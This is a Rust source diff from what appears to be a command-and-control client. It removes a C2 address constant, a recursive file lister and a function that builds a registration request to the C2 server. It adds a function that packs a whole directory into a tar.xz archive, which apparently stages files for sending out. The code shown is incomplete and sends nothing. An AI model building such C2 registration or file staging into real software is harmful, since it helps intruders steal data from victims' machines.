@@ -1,30 +1,37 @@
-extern crate rand;
-extern crate walkdir;
-
-use walkdir::{WalkDir, DirEntry};
 use std::fs::File;
-use std::fs;
-use std::io::{Read, Write};
-use std::error::Error;
-use std::str::{self, FromStr};
-use reqwest::blocking::Request;
+use std::io::BufWriter;
+use std::path::Path;
 
-const C2ADDR: &str = "c2serveraddr";
+use tar::Builder;
+use xz2::write::XzEncoder;
 
-fn get_all_files(dir: &str) -> Vec<String> {
-    let mut file_paths = Vec::new();
-    
-    for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {
-        if entry.file_type().is_file() {
-            file_paths.push(entry.path().display().to_string());
-        }
-    }
-    
-    file_paths
-}
+// Credit: ChatGPT-4o
+pub fn compress_directory_to_tar_xz(src_dir: String, dest_file: String) -> std::io::Result<()> {
+    // Open the destination file
+    let tar_xz_file = File::create(dest_file)?;
 
-pub fn register() -> Result<(), Box<dyn Error>> {
-    let c2_register_url = format!("http://{C2ADDR}/client/register");
-    let _register_reqwest = Request::new(reqwest::Method::POST, reqwest::Url::from_str(&c2_register_url)?);
+    // Wrap the file in a buffered writer for better performance
+    let buf_writer = BufWriter::new(tar_xz_file);
+
+    // Create an XZ encoder with the buffered writer
+    let mut xz_encoder = XzEncoder::new(buf_writer, 9); // 9 is the compression level
+
+    // Create a tar builder that writes to the XZ encoder
+    {
+        let mut tar_builder = Builder::new(&mut xz_encoder);
+
+        // Append the directory to the tar archive
+        tar_builder.append_dir_all(".", src_dir)?;
+
+        // Finish the tar archive
+        tar_builder.finish()?;
+    } // tar_builder is dropped here, ending the borrow on xz_encoder
+
+    // Finish the XZ encoding
+    xz_encoder.finish()?;
+
     Ok(())
 }
+
+
+
